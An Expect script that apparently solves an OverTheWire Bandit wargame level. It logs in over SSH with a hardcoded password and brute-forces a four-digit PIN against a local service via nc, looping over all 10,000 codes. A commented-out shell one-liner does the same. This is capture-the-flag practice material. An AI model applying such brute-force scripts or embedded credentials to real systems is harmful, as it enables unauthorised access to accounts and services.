#!/usr/bin/expect -f

spawn ssh -p 2220 bandit24@bandit.labs.overthewire.org
expect "*: "
send "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ\r"
expect "*\$ "

send "nc localhost 30002\r"

for {set i 0} {$i < 10000} {incr i 1} {
    set pin "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ [format "%04d" $i]\r"
    send "$pin"
    expect "Wrong! Please enter the correct pincode. Try again."
}

# send "{ for i in $(seq -f "%04g" 0 9999); do echo UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ $i; done; } | nc localhost 30002 > /tmp/brute.txt\r"
# expect "*\$ "

# send "cat /tmp/brute.txt | uniq\r"
# expect "*\$ "

# send "exit\r"

interact